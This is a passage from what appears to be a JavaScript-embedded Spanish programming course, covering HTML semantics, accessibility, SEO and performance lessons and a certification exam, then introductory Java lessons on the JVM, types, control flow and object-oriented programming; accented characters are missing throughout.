## Seccin 3: Desafo de Formulario Accesible

Crea el HTML para un formulario de **Registro de Usuario** que cumpla con:
1.  **Nombre de Usuario:** Obligatorio, mnimo 4 caracteres.
2.  **Email:** Validacin nativa de formato de correo.
3.  **Contrasea:** Campo oculto, obligatorio.
4.  **Pas de Origen:** Una lista desplegable (\`select\`).
5.  **Trminos y Condiciones:** Un checkbox que deba marcarse obligatoriamente para enviar el formulario.
6.  **Botn de Envo:** Un botn con texto "Crear Cuenta".

*Restriccin:* No uses CSS ni JS. La validacin debe ser nativa del navegador.

## Criterios de Aprobacin

*   [ ] Diferenciacin clara y correcta entre \`<section>\` y \`<article>\`.
*   [ ] Formularios 100% accesibles (todos los inputs tienen labels asociados).
*   [ ] Uso de atributos de validacin HTML5 (\`required\`, \`type\`, \`minlength\`).
*   [ ] Ausencia de \`divs\` innecesarios para estructura de texto.
`,completed:!1,isProject:!0},{id:"html-senior-arquitectura-frontend",title:"HTML como Base de Arquitectura",level:"senior",content:`# Leccin 19: HTML como Base de Arquitectura

## 1. El HTML dicta el CSS y el JS

Un Arquitecto Frontend sabe que el HTML no es solo "pintar cajas". Es la **Single Source of Truth** de la estructura de la aplicacin.
Si tu HTML es defectuoso, tu CSS ser un infierno de \`!important\` y selectores anidados imposibles, y tu JS estar lleno de \`parentElement.parentElement\`.

## 2. Profundidad del DOM (DOM Depth)

*   **El Problema:** Un DOM excesivamente anidado aumenta el uso de memoria RAM y ralentiza el re-calculo de estilos (Reflow).
*   **Caso Real:** Frameworks que envuelven todo en \`div\`s innecesarios.
*   **Mtrica:** Google Lighthouse lanza advertencia si excedes 1500 nodos o 32 niveles de profundidad.

** Arquitectura Pobre:**
\`\`\`html
<div class="card-wrapper">
  <div class="card-inner">
    <div class="card-content">
      <div class="card-text">
        Texto
      </div>
    </div>
  </div>
</div>
\`\`\`

** Arquitectura Plana:**
\`\`\`html
<article class="card">
  <p class="card__text">Texto</p>
</article>
\`\`\`

## 3. Atomic Design en HTML

Al pensar en componentes (tomos, Molculas, Organismos), el HTML debe reflejar esa independencia.
Un organismo (ej: Header) no debe depender de un ID nico si planeas tener mltiples headers (ej: en un modal y en el body).

## 4. Pregunta de Entrevista Senior

> *"Por qu evitar selectores de ID \`#\` en CSS y JS vinculado a componentes reutilizables?"*

**Respuesta Esperada:**
Porque los IDs deben ser nicos en todo el DOM. Si reutilizo un componente con ID, rompo el HTML (IDs duplicados) y la especificidad del CSS se dispara, haciendo difcil sobrescribir estilos. Los IDs en HTML deben reservarse para anclas (\`href="#id"\`) y relaciones de accesibilidad (\`aria-labelledby="id"\`), no para estilos.
`,completed:!1},{id:"html-senior-accesibilidad-wcag",title:"Accesibilidad Avanzada (WCAG)",level:"senior",content:`# Leccin 20: Accesibilidad Avanzada (WCAG)

## 1. Ms all del \`alt\`

La accesibilidad a nivel Senior implica cumplir con WCAG 2.1 (Web Content Accessibility Guidelines) niveles AA o AAA.
No se trata solo de ciegos; es sobre navegacin por teclado, bajo contraste, reduccin de movimiento y dispositivos de entrada alternativos.

## 2. WAI-ARIA: El poder y el peligro

**Primera regla de ARIA:** No uses ARIA si HTML nativo lo soluciona.

### Roles Comunes mal usados:
*   \`role="button"\` en un \`div\` sin agregar listeners de teclado (Enter/Space).
*   \`aria-hidden="true"\` en elementos enfocables (el usuario puede llegar con tab pero el lector lo ignora -> confusin total).

## 3. Gestin del Foco (Focus Management)

En SPAs (Single Page Applications), cuando cambias de "pgina" (ruta), el foco se pierde (vuelve al body).
**Responsabilidad Senior:** Mover el foco programticamente al \`<h1>\` de la nueva pgina o al contenedor principal, para que el usuario sepa dnde est.

\`\`\`html
<h1 tabindex="-1" id="page-title">Nueva Pgina</h1>
\`\`\`
*(tabindex="-1" permite enfocarlo con JS \`el.focus()\` pero no con Tab).*

## 4. Landmarks (Hitos)

Los lectores de pantalla permiten "saltar" entre regiones. Debes garantizar que existan.

*   \`role="banner"\` (Generalmente \`<header>\`)
*   \`role="navigation"\` (\`<nav>\`)
*   \`role="main"\` (\`<main>\`)
*   \`role="contentinfo"\` (\`<footer>\`)
*   \`role="search"\` (\`<form role="search">\`)

## 5. Patrn "Skip Link"

Es un estndar de facto. Un enlace oculto visualmente que aparece al presionar Tab por primera vez.
Permite saltar el men de navegacin masivo e ir directo al contenido.

\`\`\`html
<a href="#contenido-principal" class="sr-only focus:not-sr-only">
  Saltar al contenido
</a>
...
<main id="contenido-principal">
\`\`\`
`,completed:!1},{id:"html-senior-seo-tecnico",title:"SEO Tcnico y Datos Estructurados",level:"senior",content:`# Leccin 21: SEO Tcnico y Datos Estructurados

## 1. Hablando con los Robots

El HTML es la nica garanta de comunicacin con Googlebot. JavaScript puede fallar, demorar o no ejecutarse en la fase de indexacin inicial.

## 2. JSON-LD (Schema.org)

Como Senior, no solo usas meta tags. Inyectas Datos Estructurados para ganar "Rich Snippets" (estrellitas, precios, recetas en Google).

\`\`\`html
<script type="application/ld+json">
{
  "@context": "https://schema.org/",
  "@type": "Product",
  "name": "Zapatillas Runner X",
  "image": "https://sitio.com/foto.jpg",
  "brand": {
    "@type": "Brand",
    "name": "MarcaTop"
  },
  "offers": {
    "@type": "Offer",
    "priceCurrency": "USD",
    "price": "199.00",
    "availability": "https://schema.org/InStock"
  }
}
<\/script>
\`\`\`
*Esto va en el HTML, no es visible para el usuario, pero es oro puro para SEO.*

## 3. SEO Internacional (Hreflang)

Si tu sitio tiene versiones en varios idiomas, debes decrselo a Google en el HTML.

\`\`\`html
<link rel="alternate" hreflang="es" href="https://sitio.com/es/" />
<link rel="alternate" hreflang="en" href="https://sitio.com/en/" />
<link rel="alternate" hreflang="x-default" href="https://sitio.com/" />
\`\`\`

## 4. Open Graph al detalle

No solo \`og:image\`.
*   \`og:type\`: \`website\`, \`article\`, \`video.movie\`.
*   \`twitter:card\`: \`summary_large_image\` para destacar ms en Twitter.

## 5. Desafo Tcnico
Audita una pgina. Si ves que el ttulo \`<h1>\` cambia dinmicamente con JS despus de 3 segundos... Google lo indexa?
**Respuesta:** Probablemente s en la segunda pasada (rendering), pero pierdes el crawl budget y la inmediatez. **Solucin:** Server Side Rendering (SSR) del \`<h1>\`.
`,completed:!1},{id:"html-senior-html-performance",title:"HTML y Performance (Web Vitals)",level:"senior",content:'# Leccin 22: HTML y Performance (Web Vitals)\n\n## 1. Critical Rendering Path\n\nEl navegador detiene el pintado (Render Blocking) cuando encuentra CSS o JS sncrono en el `<head>`.\nTu trabajo es organizar el HTML para que el usuario vea algo lo antes posible (First Contentful Paint).\n\n## 2. Resource Hints\n\nInstrucciones al navegador para anticiparse.\n\n*   `rel="preconnect"`: "Navegador, vamos a pedir datos a `api.misitio.com`, ve haciendo el handshake DNS/TCP/TLS ya".\n*   `rel="preload"`: "Este recurso (fuente woff2, imagen hero) es CRTICO. Descrgalo con alta prioridad antes de que el parser lo encuentre".\n*   `rel="prefetch"`: "Probablemente el usuario vaya a la pgina `/contacto`, descrgala en segundo plano (low priority)".\n\n```html\n<link rel="preconnect" href="https://fonts.googleapis.com">\n<link rel="preload" href="/fonts/mi-fuente.woff2" as="font" type="font/woff2" crossorigin>\n```\n\n## 3. CLS (Cumulative Layout Shift)\n\nSi tus imgenes no tienen dimensiones en el HTML, el navegador no reserva espacio. Cuando la imagen carga, empuja el texto hacia abajo. Esto es CLS y Google te penaliza severamente.\n\n**Solucin Senior:**\nSiempre, SIEMPRE atributos `width` y `height` en `<img>` e `<iframe>`. El navegador usa estos ratios para aspect-ratio CSS automtico.\n\n```html\n<!-- El navegador reserva un cuadro de 800x600 antes de bajar 1 bit de la imagen -->\n<img src="foto.jpg" width="800" height="600" alt="...">\n```\n\n## 4. Decodificacin de Imgenes\n\n```html\n<img src="..." decoding="async">\n```\nLe dice al navegador que decodifique la imagen fuera del hilo principal para no congelar el scroll.\n',completed:!1},{id:"html-senior-spa-ssr-hydration",title:"HTML en la Era Moderna (SPA, SSR, Hydration)",level:"senior",content:`# Leccin 23: HTML en la Era Moderna (SPA, SSR, Hydration)

## 1. El Valle Inquietante de la Hidratacin

En frameworks como Next.js o Remix, el servidor enva HTML puro (SSR). Luego, React "hidrata" ese HTML (le pega los eventos JS).
**El error:** Si tu HTML es invlido, la hidratacin falla y la UI colapsa o parpadea.

## 2. Errores de Anidacin Prohibidos

El navegador intenta corregir tu HTML *antes* de que React tome el control. Si React espera una estructura y encuentra otra (porque el navegador la arregl), BOOM: Hydration Error.

**Caso Clsico:**
\`\`\`html
<p>
  <div>Soy un div ilegal dentro de un p</div>
</p>
\`\`\`
*El navegador cerrar el \`<p>\` automticamente antes del \`<div>\`. React buscar el div DENTRO del p y no lo encontrar.*

**Otros casos prohibidos:**
*   \`<a>\` dentro de \`<a>\`.
*   \`<form>\` dentro de \`<form>\`.
*   \`<ul>\` dentro de \`<p>\`.

## 3. Streaming HTML

Lo ltimo en arquitectura. Enviar el HTML por pedazos.
El servidor enva el \`<head>\` y el esqueleto del \`<body>\` inmediatamente, y deja abierta la conexin para enviar los datos ms pesados despus.
Tu HTML debe ser robusto para soportar llegar incompleto visualmente y rellenarse.

## 4. Progressive Enhancement

Construye tu funcionalidad bsica con HTML (links \`href\`, forms \`action\`). Luego mejora con JS (AJAX, transiciones).
Si el JS falla (pasa a menudo en redes mviles), tu sitio HTML estndar sigue funcionando.
Esto diferencia a un Senior de un "React Developer".
`,completed:!1},{id:"html-senior-errores-produccion",title:"Errores Estructurales en Produccin",level:"senior",content:`# Leccin 24: Errores Estructurales en Produccin

## 1. IDs Duplicados en Loops

El error ms comn en React/Vue/Angular.
Generar una lista de elementos y ponerles \`id="boton-borrar"\`.
Resultado: HTML invlido. \`document.getElementById\` solo devuelve el primero. Los lectores de pantalla fallan al asociar labels.

## 2. Botones sin \`type\`

Dentro de un \`<form>\`, cualquier \`<button>\` es \`type="submit"\` por defecto.
Si tienes un botn "Cancelar" o "Siguiente paso" dentro de un form y no le pones \`type="button"\`, al hacer clic **enviar el formulario**.

\`\`\`html
<form>
    <!-- Esto enva el form y recarga la pgina por error -->
    <button>Cancelar</button> 
    
    <!-- Esto es correcto -->
    <button type="button">Cancelar</button>
</form>
\`\`\`

## 3. Olvidar el atributo \`lang\` dinmico

En sitios multi-idioma, cambiar el contenido con JS sin cambiar \`<html lang="...">\` hace que los sintetizadores de voz lean espaol con acento ingls (o viceversa).

## 4. Headings por Esttica

Usar \`<h5>\` para un texto legal en el footer porque "se ve del tamao correcto".
**Solucin Senior:** Usa \`<p class="legal-text">\` y ajusta el tamao con CSS. Mantn la semntica pura.
`,completed:!1},{id:"html-senior-auditoria-real",title:"Auditora Real (Desafo Senior)",level:"senior",content:`# Leccin 25: Auditora Real (Desafo Senior)

## Objetivo
Realizar una auditora forense del HTML de un sitio en produccin.

## Herramientas
1.  **View Source (Ctrl+U):** Ver el HTML crudo que llega del servidor.
2.  **Inspect Element (F12):** Ver el DOM vivo (ya manipulado por JS y el navegador).
3.  **Lighthouse / Axe:** Auditora automatizada.
4.  **W3C Validator:** La prueba de la verdad.

## El Desafo

Toma un sitio popular (ej: un e-commerce local o sitio de noticias).

1.  **Busca "Div-itis":** Encuentra un componente que podra haber sido \`<article>\` o \`<section>\`.
2.  **Prueba de Teclado:** Intenta navegar todo el sitio sin mouse. Ves dnde est el foco? Puedes abrir los mens desplegables? Si no, falta HTML semntico (\`<button>\` vs \`div\`) o \`tabindex\`.
3.  **Prueba de Zoom:** Haz zoom al 200%. Se rompe el contenido? (Problema de \`meta viewport\` o CSS, pero a veces HTML rgido).
4.  **Verificacin de Outline:** Usa una extensin para ver la estructura de H1-H6. Tiene sentido lgica o saltan de H1 a H4?

## Entrega (Mental)
Como Senior, tu trabajo es detectar estos fallos en Code Reviews ANTES de que lleguen a produccin. Tu "Sensei" interno debe activarse cada vez que veas un \`div onclick\`.
`,completed:!1},{id:"html-senior-spa-antipatterns",title:"HTML en SPAs y Anti-patrones Modernos",level:"senior",objective:"Evitar la degradacin de la web moderna recuperando las bases del HTML en entornos controlados por JavaScript.",explanation:'En el desarrollo moderno con frameworks (React, Vue, Angular), es comn olvidar que el resultado final sigue siendo HTML. El anti-patrn ms peligroso es la "Hydration Mismatch" (cuando el HTML del servidor no coincide con el del cliente). Tambin analizamos la "Div-itis" moderna causada por los wrappers de componentes y cmo afecta a la accesibilidad y a la memoria del navegador.',examples:[`/* Anti-patrn: Wrapper innecesario */
const MyComponent = () => (
  <div> {/* Es necesario este div si ya tenemos una estructura semntica fuera? */}
    <article>...</article>
  </div>
);

/* Solucin: React Fragments o etiquetas semnticas directas */
const BetterComponent = () => (
  <article>...</article>
);`],commonMistakes:["Depender 100% de JS para el renderizado, rompiendo la funcionalidad bsica cuando el script falla o se bloquea.","Uso incorrecto de IDs duplicados al reutilizar componentes en un mismo rbol DOM.","Re-inventar comportamientos de formularios HTML nativos con JS, perdiendo validaciones automticas y accesibilidad de teclado."],bestPractices:["Utiliza Fragments o `<>` en tu framework para evitar contaminar el DOM con nodos de posicionamiento.",'Sigue el principio de "Progressive Enhancement": que la web sea usable (aunque sea bsica) sin JavaScript.','Delega en el navegador siempre que sea posible (ej. usa input type="date" en lugar de una librera pesada de JS).'],exercises:['Debug: Soluciona un "Hydration Mismatch" en un componente complejo causado por un HTML invlido generado en el servidor.',"Refactoring: Elimina el 50% de los nodos DOM de una landing page compleja sin alterar su diseo visual, optimizando el uso de wrappers en el framework.","Decisin Tcnica: Evala si usar un Custom Element nativo o un componente de React para un widget que debe insertarse en mltiples proyectos con diferentes tecnologas."],extraNotes:"El Shadow DOM es una herramienta poderosa pero peligrosa. Un senior debe saber cundo usarlo para aislar estilos y cundo el Light DOM es preferible para mantener la accesibilidad global y la integracin con herramientas de terceros.",completed:!1},{id:"html-final-evaluation",title:"Examen de Certificacin: HTML Profesional",level:"senior",content:'# Evaluacin Final de Mdulo: HTML Moderno, Semntica y Accesibilidad\n\n## 1.  Objetivo de la evaluacin\nValidar la capacidad tcnica del estudiante para construir estructuras web robustas, semnticamente correctas y accesibles, siguiendo los estndares de la W3C y las mejores prcticas de la industria (SEO, Performance, WCAG). No se busca solo "maquetar", sino demostrar pensamiento arquitectnico en el documento.\n\n---\n\n## 2.  Estructura de la evaluacin\nLa evaluacin se divide en tres ejes fundamentales:\n*   **Eje Terico-Conceptual:** Entendimiento del modelo de objetos del documento (DOM) y la semntica.\n*   **Eje de Depuracin (Debugging):** Identificacin de antipatrones y errores de accesibilidad.\n*   **Eje Prctico-Arquitectnico:** Desarrollo de un componente/pgina desde cero cumpliendo restricciones tcnicas estrictas.\n\n---\n\n## 3.  Proyecto Prctico Obligatorio\n**Reto: "Estructura de una Plataforma de Noticias Accesible"**\nEl estudiante debe escribir el cdigo HTML (sin CSS ni JS) para una pgina de artculo de noticias que contenga:\n1.  **Header Global:** Con navegacin semntica (`nav`), lista de enlaces y un buscador (usando el tipo de input correcto).\n2.  **Main Content:** \n    *   Uso de `article` para el contenido principal.\n    *   Jerarqua de encabezados (`h1` a `h3`) lgica y sin saltos de nivel.\n    *   Uso de `figure` y `figcaption` para imgenes.\n    *   Un bloque de "Relacionados" usando `aside`.\n3.  **Formulario de Newsletter:**\n    *   Debe incluir un `label` explcitamente asociado a su input.\n    *   Uso de atributos `required`, `placeholder` y `type="email"`.\n    *   Agrupacin de campos con `fieldset` y `legend`.\n4.  **Footer:** Informacin legal y jerarqua de secciones secundaria.\n\n---\n\n## 4.  Preguntas Conceptuales Clave\n1.  **Semntica vs Esttica:** Por qu es un error tcnico utilizar un `<div>` con un `onclick` en lugar de un `<button>` si visualmente se ven iguales? Explica las consecuencias en la experiencia de usuario y accesibilidad.\n2.  **Jerarqua de Encabezados:** Si un documento tiene un `h1` y luego salta directamente a un `h3`, qu impacto tiene esto en los lectores de pantalla y en el motor de bsqueda (SEO)?\n3.  **WAI-ARIA:** Cundo es estrictamente necesario utilizar atributos `aria-*` y cul es la "Regla de Oro" sobre el uso de ARIA en HTML5?\n4.  **Recursos Externos:** Explica la diferencia tcnica entre cargar un script con `defer` vs `async` dentro del `<head>`. Cul es ms seguro para asegurar la disponibilidad del DOM?\n5.  **Validacin:** Qu significa que un documento HTML sea "Well-formed" y "Valid"? Un navegador dejara de renderizar una pgina si no es vlida?\n\n---\n\n## 5.  Escenarios de Debugging\n**Caso:** Tienes el siguiente fragmento de cdigo que genera problemas en la navegacin por teclado y SEO:\n```html\n<section id="footer">\n  <div class="title" style="font-size: 24px;">Contacto</div>\n  <center>\n    <div class="btn" onclick="send()">Enviar Correo</div>\n    <img src="icon.png">\n  </center>\n</section>\n```\n**Tarea:** Identifica los 4 errores de arquitectura/buenas prcticas y reescrbelo siguiendo estndares HTML5.\n\n---\n\n## 6.  Rbrica de Evaluacin\n\n| Criterio | Excelente (Bloque de cdigo perfecto) | Insuficiente (Rechazado) |\n| :--- | :--- | :--- |\n| **Arquitectura** | Usa etiquetas semnticas (`main`, `section`, `article`) para definir reas. | Usa `div` o `table` para el layout general. |\n| **Accesibilidad** | Imgenes con `alt` descriptivo, formularios con IDs/Labels asociados. | Ausencia de `alt`, inputs sin etiquetas o labels vacos. |\n| **Jerarqua** | Sigue una progresin lgica `h1` -> `h2` -> `h3`. | Usa encabezados por su tamao visual, no por importancia. |\n| **Sintaxis** | Doctype correcto, etiquetas cerradas, atributos entre comillas. | Errores de anidacin o falta de cierre de etiquetas. |\n\n---\n\n## 7.  Criterios Mnimos Obligatorios\n*   [ ] No existen etiquetas obsoletas (`<center>`, `<font>`, `<b>` sin intencin semntica).\n*   [ ] El formulario es funcional sin necesidad de JavaScript (usa mtodos y acciones bsicos).\n*   [ ] El validador de la W3C (Nu HTML Checker) arroja 0 errores crticos.\n*   [ ] Cada imagen tiene un propsito (decorativa con `alt=""` o informativa con descripcin).\n\n---\n\n## 8.  Errores Comunes que Invalidan la Aprobacin\n1.  **Uso de `table` para maquetacin:** Automticamente descalificado.\n2.  **Mltiples `h1`:** Solo puede haber uno por contexto principal.\n3.  **Botones sin texto:** Iconos sin `aria-label` o texto oculto para lectores.\n4.  **Anidacin Prohibida:** Ejemplo: Colocar un `<a>` dentro de otro `<a>` o un `<div>` dentro de un `<span>`.\n\n---\n\n## 9.  Nivel de Dificultad y Tiempo\n*   **Dificultad:** Media - Alta (Requiere atencin al detalle).\n*   **Tiempo Estimado:** 60 - 90 minutos.\n',completed:!1,isProject:!0}]},v1={id:"java",title:"Java Empresarial",description:"El estndar de la industria para sistemas robustos, escalables y seguros. Domina la JVM y el desarrollo Orientado a Objetos.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"java-01-intro-java",title:"Qu es Java y la JVM?",level:"junior",content:`# Leccin 01: Qu es Java y la JVM?

**Java** es el estndar de oro del desarrollo empresarial. Si un sistema debe ser robusto, escalar a millones de usuarios y mantenerse por dcadas, probablemente est hecho en Java.

## 1. "Write Once, Run Anywhere"
Java no compila directamente a cdigo de mquina (como C++), ni es interpretado lnea por lnea (como Python).
Java compila a **Bytecode** (\`.class\`).

Este Bytecode corre sobre la **JVM (Java Virtual Machine)**.
*   Si instalas la JVM en Windows, tu cdigo corre en Windows.
*   Si instalas la JVM en Linux, tu MISMO cdigo corre en Linux.
*   No necesitas recompilar nada!

## 2. JDK, JRE y JVM
*   **JVM:** La mquina virtual.
*   **JRE (Java Runtime Environment):** JVM + Libreras para ejecutar apps.
*   **JDK (Java Development Kit):** JRE + Compilador (\`javac\`) para desarrollar apps.

## 3. Estructura Bsica
En Java, **TODO** debe estar dentro de una clase.
\`\`\`java
public class HolaMundo {
    public static void main(String[] args) {
        System.out.println("Hola Mundo desde Java!");
    }
}
\`\`\`
*   \`public class HolaMundo\`: Define la clase. El archivo debe llamarse \`HolaMundo.java\`.
*   \`public static void main\`: Es el punto de entrada. Aqu empieza todo.

---

### Concepto Junior:
Java es un lenguaje **Fuertemente Tipado** y **Esttico**. Debes declarar el tipo de cada variable antes de usarla, y no puedes cambiarlo despus.
`,completed:!1},{id:"java-02-tipos-datos-envoltorio",title:"Tipos de Datos (Primitivos vs Objetos)",level:"junior",content:'# Leccin 02: Tipos de Datos (Primitivos vs Objetos)\n\nEn Java, no todo es un objeto. Existen los **Tipos Primitivos**.\n\n## 1. Primitivos (8 tipos)\nSon los valores bsicos. Ocupan memoria fija y son muy rpidos.\n*   **Enteros:** `byte`, `short`, `int` (el ms usado), `long`.\n*   **Decimales:** `float`, `double` (el ms usado).\n*   **Caracteres:** `char` (solo una letra con comillas simples \'A\').\n*   **Booleanos:** `boolean` (true/false).\n\n```java\nint edad = 30;\ndouble precio = 99.99;\nboolean esValido = true;\n```\n\n## 2. Strings (Clases)\n`String` **NO es un tipo primitivo**, es una **Clase** (Objeto). Por eso `String` empieza con mayscula.\n```java\nString nombre = "Octavio"; // Comillas dobles\n```\n\n## 3. Clases Envoltorio (Wrapper Classes)\nA veces necesitamos tratar primitivos como objetos (por ejemplo, para meterlos en una Lista).\n*   `int` -> `Integer`\n*   `double` -> `Double`\n*   `boolean` -> `Boolean`\n\nEstas clases nos dan mtodos tiles:\n```java\nint maximo = Integer.MAX_VALUE; // 2147483647\nString numeroTexto = Integer.toString(123);\n```\n\n---\n\n### Misin Junior:\nNunca compares dos Strings con `==`. Eso compara **referencias de memoria** (si son el mismo objeto), no el contenido.\n*   **MAL:** `if (nombre == "Ana")`\n*   **BIEN:** `if (nombre.equals("Ana"))`\n',completed:!1},{id:"java-03-control-flujo-bucles",title:"Estructuras de Control (If, While, For)",level:"junior",content:`# Leccin 03: Estructuras de Control (If, While, For)

La lgica del programa es como un semforo.

## 1. Condicionales (if, else if, else)
Similar a C# y JS. Recuerda que no existe el "Truthiness" como en JS (donde \`"Hola"\` es true). La condicin DEBE ser un booleano.
\`\`\`java
int edad = 18;
if (edad >= 18) {
    System.out.println("Mayor de edad");
} else {
    System.out.println("Menor de edad");
}
\`\`\`

## 2. Switch
Para evitar mltiples \`if-else\` cuando comparas una sola variable.
\`\`\`java
int dia = 3;
switch (dia) {
    case 1:
        System.out.println("Lunes");
        break; // Importante
    case 5:
        System.out.println("Viernes");
        break;
}
\`\`\`

## 3. Bucles (While, Do-While, For)
### While
Se ejecuta mientras la condicin sea true.
\`\`\`java
int i = 0;
while (i < 5) {
    System.out.println(i);
    i++;
}
\`\`\`

### For (Iteracin)
Mejor para recorrer arrays.
\`\`\`java
for (int i = 0; i < 5; i++) {
    System.out.println("Iteracin: " + i);
}
\`\`\`

### For-Each (Enhanced For)
La forma moderna de iterar Colecciones.
\`\`\`java
int[] numeros = {1, 2, 3};
for (int num : numeros) {
    System.out.println(num);
}
\`\`\`

---

### Misin Junior:
Nunca olvides el \`break\` en un \`switch\`. Si lo olvidas, Java seguir ejecutando los casos de abajo (Casos "Fall-through").
`,completed:!1},{id:"java-04-metodos-alcance",title:"Mtodos y Alcance (Scoping)",level:"junior",content:`# Leccin 04: Mtodos y Alcance (Scoping)

Un mtodo es una funcin que pertenece a una clase.

## 1. Definicin Bsica (Public, Static, Void)
\`\`\`java
// Modificador | Esttico? | Retorno | Nombre | Argumentos
public static int sumar(int a, int b) {
    return a + b;
}
\`\`\`
*   **public:** Se puede acceder desde cualquier parte.
*   **static:** No necesitas crear una instancia (\`new Calculadora()\`) para llamarlo. \`Calculadora.sumar(5, 5)\`.
*   **int:** Tipo de dato que **devuelve**. Si no devuelve nada, usa \`void\`.

## 2. Parmetros y Valores (Pass-by-Value)
Java siempre pasa los valores por **copia**.
\`\`\`java
void cambiar(int x) {
    x = 10;
}
int a = 5;
cambiar(a);
System.out.println(a); // Sigue siendo 5
\`\`\`
Pero cuidado con los Objetos (Arrays, Lists, Classes):
\`\`\`java
void cambiarArray(int[] arr) {
    arr[0] = 99; // Modifica el array original
}
\`\`\`
Aqu pasas "la copia de la referencia", as que s puedes cambiar el contenido del objeto.

## 3. Sobrecarga de Mtodos (Overloading)
En Java, puedes tener dos mtodos con el mismo nombre si tienen diferentes argumentos.
\`\`\`java
int sumar(int a, int b) { ... }
double sumar(double a, double b) { ... }
\`\`\`
Java elige el correcto automticamente.

---

### Misin Junior:
Define siempre el tipo de retorno correctamente. Si prometes devolver un \`int\`, no puedes hacer \`return "Texto";\` (Error de compilacin).
`,completed:!1},{id:"java-05-clases-basicas-poo",title:"Clases y Objetos Bsicos (POO)",level:"junior",content:`# Leccin 05: Clases y Objetos Bsicos (POO)

"Todo en Java es un objeto". Ya es hora de que uses ese poder.

## 1. Clases vs Objetos
*   **Clase (El Molde):** \`class Coche\`. Define que todo coche tiene \`color\` y \`velocidad\`.
*   **Objeto (El Resultado):** \`new Coche()\`. El "Ferrari rojo" es una instancia real.

## 2. Atributos (Variables de Instancia)
\`\`\`java
public class Coche {
    String marca;
    String modelo;
    int ao;
    
    // Mtodo Constructor (Mismo nombre que la Clase)
    public Coche(String marca, String modelo, int ao) {
        this.marca = marca;
        this.modelo = modelo;
        this.ao = ao;
    }
}
\`\`\`
*   \`this\`: Se refiere al objeto actual (\`this.marca\` es el atributo del objeto, \`marca\` es el argumento).
*   **Constructor:** Se llama automticamente al crear el objeto (\`new Coche(...)\`).

## 3. Mtodos de Instancia
\`\`\`java
// Dentro de la clase Coche
public void encender() {
    System.out.println("El " + this.modelo + " est encendido.");
}
\`\`\`
Ahora podemos usarlo:
\`\`\`java
Coche miAuto = new Coche("Ford", "Fiesta", 2020);
miAuto.encender();
\`\`\`

---

### Misin Junior:
Aprender la visibilidad:
*   \`public\`: Visible para todo el mundo.
*   \`private\`: Solo visible DENTRO de la clase. (Recomendado para atributos).
*   \`protected\`: Visible para clases del mismo paquete y subclases.
`,completed:!1},{id:"java-06-practica-junior",title:"Prctica Java Junior: El Sistema de Biblioteca Escolar",level:"junior",content:'# Prctica Java Junior: El Sistema de Biblioteca Escolar\n\nHora de picar cdigo (bueno, al menos en tu mente o en IntelliJ)!\n\n---\n\n## 1. El Libro (Clase)\nCrea una clase `Libro` con:\n*   Atributos: `titulo` (String), `autor` (String), `paginas` (int), `prestado` (boolean).\n*   Constructor que reciba `titulo`, `autor` y `paginas`. Por defecto, `prestado` es false.\n*   Mtodo `toString()` que devuelva el ttulo y autor (ej: "1984 por George Orwell").\n\n## 2. La Biblioteca (Main)\nEn el mtodo `main`:\n1.  Crea un array de 3 libros.\n2.  Itera sobre los libros con un bucle `for-each`.\n3.  Imprime solo los libros que tengan ms de 300 pginas.\n\n## 3. Reto: Prestar Libros\n*   Agrega un mtodo `prestar()` a la clase `Libro`.\n    *   Si ya est prestado (`if (this.prestado)`), imprime "Ya prestado".\n    *   Si no, cambia `this.prestado = true` e imprime "Prestado con xito".\n*   Intenta prestar el mismo libro dos veces en el `main` y verifica que funcione.\n\n---\n\n### Misin:\nUn programador Java debe saber encapsular datos en objetos. No tengas variables sueltas (`titulo1`, `titulo2`, `titulo3`). Ten un objeto `Libro`.\n',completed:!1,isProject:!0},{id:"java-07-encapsulamiento",title:"Encapsulamiento (Getters y Setters)",level:"junior",content:`# Leccin 07: Encapsulamiento (Getters y Setters)

No dejes que nadie toque tus datos si no es con permiso.

## 1. El modificador \`private\`
\`\`\`java
public class CuentaBancaria {
    private double saldo; // Nadie puede hacer miCuenta.saldo = 1000000;
}
\`\`\`

## 2. Getters y Setters (Acceso Controlado)
Para leer y escribir el saldo, creamos mtodos pblicos.
\`\`\`java
public double getSaldo() {
    return this.saldo;
}

public void depositar(double monto) {
    if (monto > 0) {
        this.saldo += monto;
    }
}
\`\`\`
As garantizamos que nadie pueda depositar montos negativos.

## 3. JavaBeans
Es una convencin: Atributos privados, constructor vaco, getters y setters pblicos. Esto lo usan muchos frameworks (Spring, Hibernate).

---

### Misin Junior:
En IntelliJ IDEA o Eclipse, puedes generar Getters y Setters automticamente (Click derecho -> Generate). No los escribas a mano!
`,completed:!1},{id:"java-08-herencia-polimorfismo",title:"Herencia (extends) y Polimorfismo",level:"junior",content:`# Leccin 08: Herencia (extends) y Polimorfismo

No reescribas cdigo. Hereda lo que ya existe.

## 1. La palabra clave \`extends\`
\`\`\`java
public class Animal {
    public void comer() {
        System.out.println("Comiendo...");
    }
}

public class Gato extends Animal {
    public void maullar() {
        System.out.println("Miau");
    }
}
\`\`\`
Ahora el Gato puede \`maullar()\` y tambin \`comer()\`.

## 2. Sobreescritura (Override)
A veces el hijo hace lo mismo que el padre, pero a su manera.
\`\`\`java
@Override
public void comer() {
    System.out.println("Comiendo pescado...");
}
\`\`\`
*   \`@Override\`: Es una anotacin que le dice al compilador "Oye, revisa que realmente est sobreescribiendo algo de la clase padre".

## 3. Polimorfismo (La magia)
Podemos tratar a un Gato como un Animal.
\`\`\`java
Animal miMascota = new Gato();
miMascota.comer(); // Ejecuta el mtodo comer() del Gato (Comiendo pescado...)
\`\`\`
Esto permite tener una lista \`List<Animal>\` con Gatos, Perros y Pjaros, y llamar a \`.comer()\` en todos sin saber qu son exactamente.

---

### Misin Junior:
En Java solo puedes extender de **UNA** clase (\`extends Animal\`), no de varias (no existe herencia mltiple de clases). Pero puedes implementar muchas Interfaces.
`,completed:!1},{id:"java-09-colecciones",title:"Colecciones (ArrayList, HashSet, HashMap)",level:"semi-senior",content:`# Leccin 09: Colecciones (ArrayList, HashSet, HashMap)

Hasta ahora hemos usado arrays estticos (\`int[]\`). Pero en la vida real, los datos crecen y se encogen. El Framework de Colecciones es tu mejor amigo.

## 1. Listas (\`List\` y \`ArrayList\`)
Una lista ordenada que permite duplicados y crece dinmicamente.
\`\`\`java
import java.util.ArrayList;
import java.util.List;

List<String> nombres = new ArrayList<>();
nombres.add("Ana");
nombres.add("Luis");
System.out.println(nombres.get(0)); // Ana
\`\`\`

## 2. Conjuntos (\`Set\` y \`HashSet\`)
No permite duplicados y no garantiza orden.
\`\`\`java
Set<Integer> numeros = new HashSet<>();
